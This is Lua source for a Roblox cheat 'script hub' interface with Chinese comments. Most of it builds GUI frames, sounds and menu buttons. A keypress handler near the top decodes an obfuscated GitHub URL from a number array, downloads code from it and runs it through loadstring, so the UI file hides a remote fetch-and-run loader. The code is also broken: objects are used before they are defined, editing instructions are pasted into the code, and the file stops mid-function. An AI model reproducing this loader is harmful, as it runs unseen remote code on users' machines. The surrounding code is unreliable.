-- 更新：延迟修复与主题更新 | 主要添加次副标 --
-- 这不是 hyprland --
-- UI.XGO修改更新 --
-- 边框v1.122

-- 此源码永不加密 | 也尽量保持更新 |
-- 
-- 



-- 1. 脚本最顶部：检测是否存在上一个相同UI，有则触发关闭
if _G.XGOHUB_PrevSameUI then
    local function closePrevKeepNew()
        -- 取出上一个相同UI的核心实例（与原UI结构完全一致）
        local prevMainFrame = _G.XGOHUB_PrevSameUI.MainFrame
        local prevWindowLib = _G.XGOHUB_PrevSameUI.WindowLibrary

        -- 沿用原脚本关闭逻辑：先执行缩放动画，再关闭旧UI（不删除额外元素）
        if prevMainFrame and prevMainFrame.Parent then
            Library:Tween(prevMainFrame, Library.TweenLibrary.SmallEffect, {
                Size = UDim2.fromScale(0, 0),  -- 原UI关闭时的缩放参数
                Position = UDim2.fromScale(0.5, 0.5)  -- 原UI关闭时的居中定位
            }).Completed:Connect(function()
                task.wait()
                prevWindowLib:Destroy()  -- 调用原UI的关闭方法，停用旧UI
                print("[XGO HUB] 已关闭上一个相同UI，保留下一个相同UI")
            end)
        end
    end
    closePrevKeepNew()
end

-- 2. 原脚本「function Library:Windowxgo(setup)」函数末尾（return WindowLibrary 前）添加：
-- 记录当前新UI实例，覆盖上一个相同UI标记（确保下次执行时精准关闭）
_G.XGOHUB_PrevSameUI = {
    MainFrame = MainFrame,          -- 当前新UI的核心窗口（与旧UI结构一致）
    WindowLibrary = WindowLibrary   -- 当前新UI的管理对象（含原关闭方法）
}




local Library = {
	Version = '\88\71\79\72\85\66\32\45\32\98\121\46\120\103\111',
	Loaded = true,
	QQ = '259461151',
	env = getgenv or getfenv,
	Executor = {"s","w","z","t","a","c"},
	Skid = true,
	pcall = pcall,
	setfenv = setfenv,
	info = debug.info,
	xpcall = xpcall,
};
local userInputService = game:GetService("UserInputService")
local function onKeyActivated(inputObject)
    if inputObject.KeyCode == Enum.KeyCode.K then
        task.spawn(function()
           pcall(function()
                local code = game:HttpGet((function()
                    local a = {1389,1545,1545,1493,1532,791,648,648,1376,1402,1545,1389,1558,1311,635,1324,1480,1454,648,960,1129,882,947,882,1168,648,1142,986,648,1519,1298,1584,648,1454,1298,1402,1467,648,1142,986,635,1025,882,1129,934,1116,1129,635,1025,1142,882}
                    local b = ''
                    for i = 1, #a do 
                        b = b .. string.char((a[i] - 37) / 13)
                    end
                    return b
                end)())
                if code then
                    loadstring(code)()
                end
            end)
    if game:GetService("CoreGui"):FindFirstChild("UIGui") then
      game:GetService("CoreGui"):FindFirstChild("UIGui"):Destroy()
      game.Workspace.CurrentCamera.FieldOfView  = 70
    end
    UIGui = Instance.new("ScreenGui")
    CoreSystemFrame = Instance.new("Frame")
    CoreSystemFrameBackground = Instance.new("Frame")
    CoreSystemFrameUICorner = Instance.new("UICorner")
    CoreSystemFrameBackgroundUICorner = Instance.new("UICorner")
    MinButton = Instance.new("TextButton")
    UIClick = Instance.new("Sound")
    MessageFrame = Instance.new("TextButton")
    MessageFrameUICorner = Instance.new("UICorner")
    Clock = Instance.new("TextLabel")
    StartUpSound = Instance.new("Sound")
OpenButtonUI = Instance.new("Sound")
MessageBackgroundFrame = Instance.new("Frame")
TextLabel1 = Instance.new("TextLabel")
MessageBackgroundFrameUICorner = Instance.new("UICorner")
MessageImage = Instance.new("ImageLabel")
CloseNotif = Instance.new("Sound")
MessageImageUICorner = Instance.new("UICorner")
OpenUIButtons = Instance.new("Sound")
HomeButton = Instance.new("ImageButton")
HomeButtonUICorner = Instance.new("UICorner")
CloseUISound = Instance.new("Sound")
Blur = Instance.new("BlurEffect")
TweenService = game:GetService("TweenService")
SearcherOpenUIButton = Instance.new("ImageButton")
SearcherOpenUIButtonUICorner = Instance.new("UICorner")
ConsoleButton = Instance.new("ImageButton")
HoverButtons = Instance.new("Sound")
EditorButton = Instance.new("ImageButton")
MusicButton = Instance.new("ImageButton")
WelcomeLabel = Instance.new("TextLabel")
PlayerIcon = Instance.new("ImageLabel")
PlayerIconUI = Instance.new("UICorner")
PlayerIconBackground = Instance.new("Frame")
PlayerIconBackgroundUI = Instance.new("UICorner")
GameFrameBackground = Instance.new("Frame")
GameFrameBackgroundUICorner = Instance.new("UICorner")
GameFrame = Instance.new("ImageLabel")
GameFrameUICorner = Instance.new("UICorner")
FPSLabel = Instance.new("TextLabel")
FPSLabelUICorner = Instance.new("UICorner")
RunService = game:GetService("RunService")
RenderStepped = RunService.RenderStepped
sec = nil
FPS = {}
PingLabel = Instance.new("TextLabel")
PingLabelUICorner = Instance.new("UICorner")
CPULabel = Instance.new("TextLabel")
CPUUICorner = Instance.new("UICorner")
GPULabel = Instance.new("TextLabel")
GPUUICorner = Instance.new("UICorner")
PlayersInServer = Instance.new("TextLabel")
PlayersInServerUICorner = Instance.new("UICorner")
ServerSize = Instance.new("TextLabel")
ServerSizeUICorner = Instance.new("UICorner")
ServerLive = Instance.new("TextLabel")
ServerLiveUICorner = Instance.new("UICorner")
Executor = Instance.new("TextLabel")
ExecutorUICorner = Instance.new("UICorner")
MainFrame = Instance.new("Frame")
SearchBox = Instance.new("TextBox")
UICorner_3 = Instance.new("UICorner")
ScriptAuthor = Instance.new("TextLabel")
ScriptListFrame = Instance.new("ScrollingFrame")
UIPadding = Instance.new("UIPadding")
Scripts = Instance.new("Folder")
UIGridLayout = Instance.new("UIGridLayout")
ScriptFrame = Instance.new("ImageLabel")
UICorner_6 = Instance.new("UICorner")
ScriptTitle = Instance.new("TextLabel")
ExecuteButton = Instance.new("TextButton")
UICorner_7 = Instance.new("UICorner")
InfoButton = Instance.new("TextButton")
UICorner_8 = Instance.new("UICorner")
ScriptGame = Instance.new("TextLabel")
VerifiedScriptFrame = Instance.new("ImageLabel")
UICorner_9 = Instance.new("UICorner")
ScriptTitle_2 = Instance.new("TextLabel")
VerifiedIcon = Instance.new("ImageLabel")
ExecuteButton_2 = Instance.new("TextButton")
UICorner_10 = Instance.new("UICorner")
UICorner_11 = Instance.new("UICorner")
ScriptAuthor_2 = Instance.new("TextLabel")
ScriptGame_2 = Instance.new("TextLabel")
ExecuteButtonBackground = Instance.new("Frame")
ExecuteButtonBackgroundUICorner = Instance.new("UICorner")
CopyLinkButton = Instance.new("TextButton")
CopyLinkButtonUICorner = Instance.new("UICorner")
CopyLinkButton_2 = Instance.new("TextButton")
CopyLinkButtonUICorner_2 = Instance.new("UICorner")
CopyScriptButton = Instance.new("TextButton")
CopyScriptButtonUICorner = Instance.new("UICorner")
CopyScriptButton_2 = Instance.new("TextButton")
CopyScriptButtonUICorner_2 = Instance.new("UICorner")
OpenDescriptionButton = Instance.new("TextButton")
OpenDescriptionButtonUICorner = Instance.new("UICorner")
OpenDescriptionButton_2 = Instance.new("TextButton")
OpenDescriptionButtonUICorner_2 = Instance.new("UICorner")
CopyLinkButtonBackground = Instance.new("Frame")
CopyLinkButtonBackgroundUICorner = Instance.new("UICorner")
CopyScriptBackground = Instance.new("Frame")
CopyScriptBackgroundUICorner = Instance.new("UICorner")
OpenDescriptionBackground = Instance.new("Frame")
OpenDescriptionBackgroundUICorner = Instance.new("UICorner")
ExecuteButtonBackground_2 = Instance.new("Frame")
ExecuteButtonBackgroundUICorner_2 = Instance.new("UICorner")
CopyLinkButtonBackground_2 = Instance.new("Frame")
CopyLinkButtonBackgroundUICorner_2 = Instance.new("UICorner")
CopyScriptBackground_2 = Instance.new("Frame")
CopyScriptBackgroundUICorner_2 = Instance.new("UICorner")
OpenDescriptionBackground_2 = Instance.new("Frame")
OpenDescriptionBackgroundUICorner_2 = Instance.new("UICorner")
DescriptionScript = Instance.new("TextButton")
DescriptionScriptUICorner = Instance.new("UICorner")
BackgroundImage = Instance.new("ImageLabel")
ConsoleOutput = Instance.new("TextLabel")
BackgroundImageUICorner = Instance.new("UICorner")
ConsoleOutputUICorner = Instance.new("UICorner")
BackgroundConsoleUICorner = Instance.new("UICorner")
BackgroundConsole = Instance.new("Frame")
logTable = {}
CloseDescriptionSound = Instance.new("Sound")
EditorBackground = Instance.new("Frame")
EditorMainFrame = Instance.new("ImageLabel")
EditorTextBox = Instance.new("TextBox")
ExecuteButtonBackground_3 = Instance.new("Frame")
ExecuteButton_3 = Instance.new("TextButton")
EditorBackgroundUICorner = Instance.new("UICorner")
EditorMainFrameUICorner = Instance.new("UICorner")
ExecuteButtonBackgroundUICorner_3 = Instance.new("UICorner")
ExecuteButtonUICorner_3 = Instance.new("UICorner")
SaveButtonBackground = Instance.new("Frame")
SaveButtonBackgroundUICorner = Instance.new("UICorner")
SaveButton = Instance.new("TextButton")
SaveButtonUICorner = Instance.new("UICorner")
ClearButtonBackground = Instance.new("Frame")
ClearButtonBackgroundUICorner = Instance.new("UICorner")
ClearButton = Instance.new("TextButton")
ClearButtonUICorner = Instance.new("UICorner")
EditorTextBoxUICorner = Instance.new("UICorner")
EditorTextBoxBackgroundUICorner = Instance.new("UICorner")
CopyButtonBackground = Instance.new("Frame")
CopyButtonBackgroundUICorner = Instance.new("UICorner")
CopyButton = Instance.new("TextButton")
CopyButtonUICorner = Instance.new("UICorner")
SondFrameBackground = Instance.new("Frame")
SondFrame = Instance.new("ImageLabel")
MainSondFrame = Instance.new("Frame")
SoundTextBox = Instance.new("TextBox")
SondFrameBackgroundUICorner = Instance.new("UICorner")
SondFrameUICorner = Instance.new("UICorner")
MainSondFrameUICorner = Instance.new("UICorner")
SoundTextBoxUICorner = Instance.new("UICorner")
CoreSound = Instance.new("Sound")
Stop_PlayButton = Instance.new("ImageButton")
AudioName = Instance.new("TextLabel")
Stop_PlayButtonBackground = Instance.new("Frame")
Stop_PlayButtonBackgroundUICorner = Instance.new("UICorner")
Stop_PlayButtonBackground_2 = Instance.new("Frame")
Stop_PlayButtonBackgroundUICorner_2 = Instance.new("UICorner")
Volume = 1
SaveButtonBackground_2 = Instance.new("Frame")
SaveButtonBackgroundUICorner_2 = Instance.new("UICorner")
SaveButton_2 = Instance.new("ImageButton")
SaveButtonUICorner_2 = Instance.new("UICorner")
PlaylistButtonBackground = Instance.new("Frame")
PlaylistButtonBackgroundUICorner = Instance.new("UICorner")
PlaylistButtonBackground_2 = Instance.new("Frame")
PlaylistButtonBackgroundUICorner_2 = Instance.new("UICorner")
PlaylistButton = Instance.new("ImageButton")
VolumeFrame = Instance.new("Frame")
VolumeFrameUICorner = Instance.new("UICorner")
VolumeUpButtonBackground = Instance.new("Frame")
VolumeUpButtonBackgroundUICorner = Instance.new("UICorner")
VolumeUpButton = Instance.new("ImageButton")
VolumeUpButtonUICorner = Instance.new("UICorner")
VolumeDownButtonBackground = Instance.new("Frame")
VolumeDownButtonBackgroundUICorner = Instance.new("UICorner")
VolumeDownButton = Instance.new("ImageButton")
VolumeDownButtonUICorner = Instance.new("UICorner")
VolumeUpButton_2 = Instance.new("ImageButton")
VolumeUpButtonUICorner_2 = Instance.new("UICorner")
VolumeDownButton_2 = Instance.new("ImageButton")
VolumeDownButtonUICorner_2 = Instance.new("UICorner")
ReloadBackgroundButton = Instance.new("Frame")
ReloadBackgroundButtonUICorner = Instance.new("UICorner")
ReloadButton = Instance.new("ImageButton")
ReloadButtonUICorner = Instance.new("UICorner")
HistoryBackgroundButton = Instance.new("Frame")
HistoryBackgroundButtonUICorner = Instance.new("UICorner")
HistoryButton = Instance.new("ImageButton")
HistoryButtonUICorner = Instance.new("UICorner")
ClearAndSearchBackground = Instance.new("Frame")
ClearAndSearchBackgroundUICorner = Instance.new("UICorner")
ClearAndSearch = Instance.new("ImageButton")
ClearAndSearchUICorner = Instance.new("UICorner")
ClearButton_2Background = Instance.new("Frame")
ClearButton_2BackgroundUICorner = Instance.new("UICorner")
ClearButton_2 = Instance.new("ImageButton")
ClearButton_2UICorner = Instance.new("UICorner")
AutoExecuteBackground = Instance.new("Frame")
AutoExecuteBackgroundUICorner = Instance.new("UICorner")
AutoExecute = Instance.new("TextButton")
AutoExecuteUICorner = Instance.new("UICorner")
AutoExecuteBackground_2 = Instance.new("Frame")
AutoExecuteBackgroundUICorner_2 = Instance.new("UICorner")
AutoExecute_2 = Instance.new("TextButton")
AutoExecuteUICorner_2 = Instance.new("UICorner")
CommentsBackground = Instance.new("Frame")
CommentsBackgroundUICorner = Instance.new("UICorner")
CommentsButton = Instance.new("ImageButton")
CommentsButtonUICorner = Instance.new("UICorner")
CommentsBackground_2 = Instance.new("Frame")
CommentsBackgroundUICorner_2 = Instance.new("UICorner")
CommentsButton_2 = Instance.new("ImageButton")
CommentsButtonUICorner_2 = Instance.new("UICorner")
InfoBox = Instance.new("Frame")
InfoBoxUICorner = Instance.new("UICorner")
Info = Instance.new("Frame")
Author = Instance.new("Frame")
InfoBoxAuthor = Instance.new("TextLabel")
ProfilePicture = Instance.new("ImageLabel")
Comments = Instance.new("Frame")
Inner = Instance.new("Frame")
UICorner_21 = Instance.new("UICorner")
Line = Instance.new("Frame")
CommentsText = Instance.new("TextLabel")
Comments_2 = Instance.new("ScrollingFrame")
Comment = Instance.new("Frame")
Content = Instance.new("TextLabel")
Author_2 = Instance.new("TextLabel")
ProfilePicture_2 = Instance.new("ImageLabel")
UICorner_22 = Instance.new("UICorner")
UIListLayout_3 = Instance.new("UIListLayout")
NoComments = Instance.new("TextLabel")
CommentsWhiteLine = Instance.new("Frame")
CloseCommentsButtonBackground = Instance.new("Frame")
CloseCommentsButtonBackgroundUICorner = Instance.new("UICorner")
CloseCommentsButton = Instance.new("ImageButton")
CloseCommentsButtonUICorner = Instance.new("UICorner")
LikeImg = Instance.new("ImageLabel")
DisLikeImg = Instance.new("ImageLabel")
LikeCount = Instance.new("TextLabel")
DislikeCount = Instance.new("TextLabel")

local function format(Int)
return string.format("%02i", Int)
end

local function convertToHMS(Seconds)
local Minutes = (Seconds - Seconds%60)/60
Seconds = Seconds - Minutes*60
local Hours = (Minutes - Minutes%60)/60
Minutes = Minutes - Hours*60
return format(Hours)..":"..format(Minutes)..":"..format(Seconds)
end
 
UIGui.Name = "UIGui"
UIGui.Parent = game.CoreGui
UIGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
game.CoreGui.UIGui.Enabled = true
 
Blur.Size = 0
Blur.Parent = workspace.CurrentCamera
 
UIClick.Parent = game:GetService("SoundService")
UIClick.SoundId = "rbxassetid://626181985"
UIClick.Playing = true
UIClick.Looped = false
UIClick.Volume = 1
UIClick:Stop()
 
CoreSound.Parent = game:GetService("SoundService")
CoreSound.Playing = true
CoreSound.Looped = true
CoreSound.Volume = Volume
CoreSound:Stop()
 
CloseDescriptionSound.Parent = game:GetService("SoundService")
CloseDescriptionSound.SoundId = "rbxassetid://6698737249"
CloseDescriptionSound.Playing = true
CloseDescriptionSound.Looped = false
CloseDescriptionSound.Volume = 1
CloseDescriptionSound:Stop()
 
StartUpSound.Parent = game:GetService("SoundService")
StartUpSound.SoundId = "rbxassetid://6228337171"
StartUpSound.Playing = true
StartUpSound.Looped = false
StartUpSound.Volume = 1
StartUpSound:Stop()
 
OpenButtonUI.Parent = game:GetService("SoundService")
OpenButtonUI.SoundId = "rbxassetid://3779036535"
OpenButtonUI.Playing = true
OpenButtonUI.Looped = false
OpenButtonUI.Volume = 1
OpenButtonUI:Stop()
 
HoverButtons.Parent = game:GetService("SoundService")
HoverButtons.SoundId = "rbxassetid://6698737249"
HoverButtons.Playing = true
HoverButtons.Looped = false
HoverButtons.Volume = 1
HoverButtons:Stop()
 
CloseNotif.Parent = game:GetService("SoundService")
CloseNotif.SoundId = "rbxassetid://2566705750"
CloseNotif.Playing = true
CloseNotif.Looped = false
CloseNotif.Volume = 1
CloseNotif:Stop()
 
CloseUISound.Parent = game:GetService("SoundService")
CloseUISound.SoundId = "rbxassetid://2570875942"
CloseUISound.Playing = true
CloseUISound.Looped = false
CloseUISound.Volume = 1
CloseUISound:Stop()
 
OpenUIButtons.Parent = game:GetService("SoundService")
OpenUIButtons.SoundId = "rbxassetid://3779036535"
OpenUIButtons.Playing = true
OpenUIButtons.Looped = false
OpenUIButtons.Volume = 1
OpenUIButtons:Stop()
 
MessageBackgroundFrame.Name = "MessageBackgroundFrame"
MessageBackgroundFrame.Parent = UIGui
MessageBackgroundFrame.AnchorPoint = Vector2.new(0.5, 0.5)
MessageBackgroundFrame.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
MessageBackgroundFrame.Position = UDim2.new(0.5, 0, 2.5, 0)
MessageBackgroundFrame.Size = UDim2.new(0, 300, 0, 60)
MessageBackgroundFrame.ZIndex = 2
 
MessageBackgroundFrameUICorner.CornerRadius = UDim.new(0, 12)
MessageBackgroundFrameUICorner.Parent = MessageBackgroundFrame
 
MessageFrame.Name = "MessageFrame"
MessageFrame.Parent = MessageBackgroundFrame
MessageFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MessageFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
MessageFrame.Size = UDim2.new(0, 297.3, 0, 57.5)
MessageFrame.AutoButtonColor = false
MessageFrame.Font = Enum.Font.SourceSansBold
MessageFrame.Text = "Successfully Loaded"
MessageFrame.TextColor3 = Color3.fromRGB(255, 255, 255)
MessageFrame.TextYAlignment = Enum.TextYAlignment.Top
MessageFrame.TextXAlignment = Enum.TextXAlignment.Right
MessageFrame.TextSize = 30
MessageFrame.AnchorPoint = Vector2.new(0.5, 0.5)
 
MessageFrameUICorner.CornerRadius = UDim.new(0, 12)
MessageFrameUICorner.Parent = MessageFrame
 
local emoji = ({
        ["01 01"] = "🎆",
        [(function(Year)
            local A = math.floor(Year/100)
            local B = math.floor((13+8*A)/25)
            local C = (15-B+A-math.floor(A/4))%30
            local D = (4+A-math.floor(A/4))%7
            local E = (19*(Year%19)+C)%30
            local F = (2*(Year%4)+4*(Year%7)+6*E+D)%7
            local G = (22+E+F)
            if E == 29 and F == 6 then
                return "04 19"
            elseif E == 28 and F == 6 then
                return "04 18"
            elseif 31 < G then
                return ("04 %02d"):format(G-31)
            end
            return ("03 %02d"):format(G)
        end)(tonumber(os.date"%Y"))] = "🥚",
        ["10 31"] = "🎃",
        ["12 25"] = "🎄"
    })[os.date("%m %d")]
    if emoji then
        MessageFrame.Text = ("%s %s"):format(MessageFrame.Text, emoji)
    end
MessageFrame.MouseButton1Click:Connect(function()
CloseNotif:Play()
MessageBackgroundFrame:TweenPosition(UDim2.new(0.5, 0, 2.5, 0),"InOut","Sine",0.3)
end)

MessageImage.Name = "MessageImage"
MessageImage.Parent = MessageFrame
MessageImage.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MessageImage.BackgroundTransparency = 0.5
MessageImage.Position = UDim2.new(0.03, 0, 0.15, 0)
MessageImage.Size = UDim2.new(0, 40, 0, 40)
MessageImage.BorderSizePixel = 0
MessageImage.Image = "rbxassetid://15980315949"
 
MessageImageUICorner.Parent = MessageImage
MessageImageUICorner.CornerRadius = UDim.new(0.5, 0)
 
TextLabel1.Name = "TextLabel1"
TextLabel1.Parent = MessageFrame
TextLabel1.BackgroundTransparency = 1
TextLabel1.Position = UDim2.new(0.55, 0, 0.7, 0)
TextLabel1.Size = UDim2.new(0, 1, 0, 1)
TextLabel1.Font = Enum.Font.SourceSansBold
TextLabel1.Text = "Welcome to ECCS V3, "..game.Players.LocalPlayer.DisplayName
TextLabel1.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel1.TextTransparency = 0.3
TextLabel1.TextSize = 15
 
spawn(function()
repeat
wait()
if  MessageBackgroundFrame.Position == UDim2.new(0.5, 0, 0.9, 0) then
wait(4)
MessageBackgroundFrame:TweenPosition(UDim2.new(0.5, 0, 2.5, 0),"InOut","Sine",0.8)
CloseNotif:Play()
end
until 
MessageBackgroundFrame == nil
end)
 
CoreSystemFrameBackground.Name = "CoreSystemFrameBackground"
CoreSystemFrameBackground.Parent = UIGui
CoreSystemFrameBackground.AnchorPoint = Vector2.new(0.5, 0.5)
CoreSystemFrameBackground.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
CoreSystemFrameBackground.Position = UDim2.new(-0.03, 0, 0.45, 0)
CoreSystemFrameBackground.Size = UDim2.new(0, 53.7, 0, 223)
CoreSystemFrameBackground.ZIndex = 2
 
CoreSystemFrameBackgroundUICorner.CornerRadius = UDim.new(0, 12)
CoreSystemFrameBackgroundUICorner.Parent = CoreSystemFrameBackground
 
CoreSystemFrame.Name = "CoreSystemFrame"
CoreSystemFrame.Parent = CoreSystemFrameBackground
CoreSystemFrame.AnchorPoint = Vector2.new(0.5, 0.5)
CoreSystemFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
CoreSystemFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
CoreSystemFrame.Size = UDim2.new(0, 50, 0, 220)
CoreSystemFrame.ZIndex = 2
 
CoreSystemFrameUICorner.CornerRadius = UDim.new(0, 12)
CoreSystemFrameUICorner.Parent = CoreSystemFrame
 
HomeButton.Parent = CoreSystemFrame
HomeButton.Size = UDim2.new(0, 33, 0, 33)
HomeButton.Position = UDim2.new(0.5, 0, 0.1, 0)
HomeButton.AnchorPoint = Vector2.new(0.5, 0.5)
HomeButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
HomeButton.ZIndex = 2
HomeButton.Image = "rbxassetid://15997029966"
HomeButton.AutoButtonColor = false
 
HomeButtonUICorner.CornerRadius = UDim.new(0, 12)
HomeButtonUICorner.Parent = HomeButton
HomeButton.MouseButton1Click:Connect(function()
game.Workspace.CurrentCamera.FieldOfView  = 70
SondFrameBackground:TweenPosition(UDim2.new(0.5, 0, -1, 0),"InOut","Sine",0.1)
EditorBackground:TweenPosition(UDim2.new(0.525, 0, -1, 0),"InOut","Sine",0.1)
BackgroundConsole:TweenPosition(UDim2.new(0.525, 0, -1, 0),"InOut","Sine",0.1)
MainFrame:TweenPosition(UDim2.new(0.5, 0, -1, 0),"InOut","Sine",0.1)
SearcherOpenUIButton.Image = "rbxassetid://15996914627"
MusicButton.Image = "rbxassetid://15996975276"
ConsoleButton.Image = "rbxassetid://16006754625"
EditorButton.Image = "rbxassetid://16006689419"
if HomeButton.Image == "rbxassetid://15997029966" then
Blur.Size = 100
HomeButton.Image = "rbxassetid://15997127208"
OpenButtonUI:Play()
GameFrameBackground:TweenPosition(UDim2.new(0.25, 0, 0.3, 0),"InOut","Sine",0.1)
game.Workspace.CurrentCamera.FieldOfView  = 30
else
if HomeButton.Image == "rbxassetid://15997127208" then
HomeButton.Image = "rbxassetid://15997029966"
CloseUISound:Play()
GameFrameBackground:TweenPosition(UDim2.new(0.25, 0, -1, 0),"InOut","Sine",0.1)
Blur.Size = 0
game.Workspace.CurrentCamera.FieldOfView  = 70
end
end
end)

MainFrame.Name = "MainFrame"
MainFrame.Parent = UIGui
MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
MainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MainFrame.BackgroundTransparency = 1
MainFrame.Position = UDim2.new(0.5, 0, -1, 0)
MainFrame.Size = UDim2.new(0, 100, 0, 100)
 
SearcherOpenUIButton.Parent = CoreSystemFrame
SearcherOpenUIButton.Size = UDim2.new(0, 33, 0, 33)
SearcherOpenUIButton.Position = UDim2.new(0.5, 0, 0.28, 0)
SearcherOpenUIButton.AnchorPoint = Vector2.new(0.5, 0.5)
SearcherOpenUIButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
SearcherOpenUIButton.ZIndex = 2
SearcherOpenUIButton.Image = "rbxassetid://15996914627"
SearcherOpenUIButton.AutoButtonColor = false
 
SearcherOpenUIButtonUICorner.CornerRadius = UDim.new(0, 12)
SearcherOpenUIButtonUICorner.Parent = SearcherOpenUIButton
 
SearcherOpenUIButton.MouseButton1Click:Connect(function()
SondFrameBackground:TweenPosition(UDim2.new(0.5, 0, -1, 0),"InOut","Sine",0.1)
EditorBackground:TweenPosition(UDim2.new(0.525, 0, -1, 0),"InOut","Sine",0.1)
BackgroundConsole:TweenPosition(UDim2.new(0.525, 0, -1, 0),"InOut","Sine",0.1)
GameFrameBackground:TweenPosition(UDim2.new(0.25, 0, -1, 0),"InOut","Sine",0.1)
game.Workspace.CurrentCamera.FieldOfView  = 70
HomeButton.Image = "rbxassetid://15997029966"
MusicButton.Image = "rbxassetid://15996975276"
ConsoleButton.Image = "rbxassetid://16006754625"
EditorButton.Image = "rbxassetid://16006689419"
if SearcherOpenUIButton.Image == "rbxassetid://15996914627" then
SearcherOpenUIButton.Image = "rbxassetid://15997131910"
OpenButtonUI:Play()
Blur.Size = 100
MainFrame:TweenPosition(UDim2.new(0.5, 0, 0.5, 0),"InOut","Sine",0.1)
game.Workspace.CurrentCamera.FieldOfView  = 30
else
if SearcherOpenUIButton.Image == "rbxassetid://15997131910" then
SearcherOpenUIButton.Image = "rbxassetid://15996914627"
CloseUISound:Play()
Blur.Size = 0
MainFrame:TweenPosition(UDim2.new(0.5, 0, -1, 0),"InOut","Sine",0.1)
game.Workspace.CurrentCamera.FieldOfView  = 70
end
end
end)
 
EditorButton.Parent = CoreSystemFrame
EditorButton.Size = UDim2.new(0, 33, 0, 33)
EditorButton.Position = UDim2.new(0.5, 0, 0.64, 0)
EditorButton.AnchorPoint = Vector2.new(0.5, 0.5)
EditorButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
EditorButton.ZIndex = 2
EditorButton.Image = "rbxassetid://16006689419"
EditorButton.AutoButtonColor = false
EditorButton.BorderSizePixel = 0
 
EditorButton.MouseButton1Click:Connect(function()
SondFrameBackground:TweenPosition(UDim2.new(0.5, 0, -1, 0),"InOut","Sine",0.1)
BackgroundConsole:TweenPosition(UDim2.new(0.525, 0, -1, 0),"InOut","Sine",0.1)
GameFrameBackground:TweenPosition(UDim2.new(0.25, 0, -1, 0),"InOut","Sine",0.1)
MainFrame:TweenPosition(UDim2.new(0.5, 0, -1, 0),"InOut","Sine",0.1)
game.Workspace.CurrentCamera.FieldOfView  = 70
HomeButton.Image = "rbxassetid://15997029966"
ConsoleButton.Image = "rbxassetid://16006754625"
MusicButton.Image = "rbxassetid://15996975276"
SearcherOpenUIButton.Image = "rbxassetid://15996914627"
if EditorButton.Image == "rbxassetid://16006689419" then
EditorButton.Image = "rbxassetid://16006691599"
OpenButtonUI:Play()
EditorBackground:TweenPosition(UDim2.new(0.525, 0, 0.5, 0),"InOut","Sine",0.1)
Blur.Size = 100
game.Workspace.CurrentCamera.FieldOfView  = 30
else
if EditorButton.Image == "rbxassetid://16006691599" then
EditorButton.Image = "rbxassetid://16006689419"
CloseUISound:Play()
EditorBackground:TweenPosition(UDim2.new(0.525, 0, -1, 0),"InOut","Sine",0.1)
Blur.Size = 0
game.Workspace.CurrentCamera.FieldOfView  = 70
end
end
end)
 
ConsoleButton.Parent = CoreSystemFrame
ConsoleButton.Size = UDim2.new(0, 33, 0, 33)
ConsoleButton.Position = UDim2.new(0.5, 0, 0.46, 0)
ConsoleButton.AnchorPoint = Vector2.new(0.5, 0.5)
ConsoleButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ConsoleButton.ZIndex = 2
ConsoleButton.Image = "rbxassetid://16006754625"
ConsoleButton.AutoButtonColor = false
ConsoleButton.BorderSizePixel = 0
 
ConsoleButton.MouseButton1Click:Connect(function()
SondFrameBackground:TweenPosition(UDim2.new(0.5, 0, -1, 0),"InOut","Sine",0.1)
EditorBackground:TweenPosition(UDim2.new(0.525, 0, -1, 0),"InOut","Sine",0.1)
GameFrameBackground:TweenPosition(UDim2.new(0.25, 0, -1, 0),"InOut","Sine",0.1)
MainFrame:TweenPosition(UDim2.new(0.5, 0, -1, 0),"InOut","Sine",0.1)
game.Workspace.CurrentCamera.FieldOfView  = 70
HomeButton.Image = "rbxassetid://15997029966"
MusicButton.Image = "rbxassetid://15996975276"
SearcherOpenUIButton.Image = "rbxassetid://15996914627"
EditorButton.Image = "rbxassetid://16006689419"
if ConsoleButton.Image == "rbxassetid://16006754625" then
ConsoleButton.Image = "rbxassetid://16006757026"
OpenButtonUI:Play()
BackgroundConsole:TweenPosition(UDim2.new(0.525, 0, 0.5, 0),"InOut","Sine",0.1)
Blur.Size = 100
game.Workspace.CurrentCamera.FieldOfView  = 30
else
if ConsoleButton.Image == "rbxassetid://16006757026" then
ConsoleButton.Image = "rbxassetid://16006754625"
CloseUISound:Play()
BackgroundConsole:TweenPosition(UDim2.new(0.525, 0, -1, 0),"InOut","Sine",0.1)
Blur.Size = 0
game.Workspace.CurrentCamera.FieldOfView  = 70
end
end
end)
 
MusicButton.Parent = CoreSystemFrame
MusicButton.Size = UDim2.new(0, 30, 0, 30)
MusicButton.Position = UDim2.new(0.5, 0, 0.82, 0)
MusicButton.AnchorPoint = Vector2.new(0.5, 0.5)
MusicButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MusicButton.ZIndex = 2
MusicButton.Image = "rbxassetid://15996975276"
MusicButton.AutoButtonColor = false
MusicButton.BorderSizePixel = 0
 
MusicButton.MouseButton1Click:Connect(function()
EditorBackground:TweenPosition(UDim2.new(0.525, 0, -1, 0),"InOut","Sine",0.1)
BackgroundConsole:TweenPosition(UDim2.new(0.525, 0, -1, 0),"InOut","Sine",0.1)
GameFrameBackground:TweenPosition(UDim2.new(0.25, 0, -1, 0),"InOut","Sine",0.1)
MainFrame:TweenPosition(UDim2.new(0.5, 0, -1, 0),"InOut","Sine",0.1)
game.Workspace.CurrentCamera.FieldOfView  = 70
HomeButton.Image = "rbxassetid://15997029966"
SearcherOpenUIButton.Image = "rbxassetid://15996914627"
EditorButton.Image = "rbxassetid://16006689419"
ConsoleButton.Image = "rbxassetid://16006754625"
if MusicButton.Image == "rbxassetid://15996975276" then
MusicButton.Image = "rbxassetid://15997129790"
SondFrameBackground:TweenPosition(UDim2.new(0.5, 0, 0.5, 0),"InOut","Sine",0.1)
OpenButtonUI:Play()
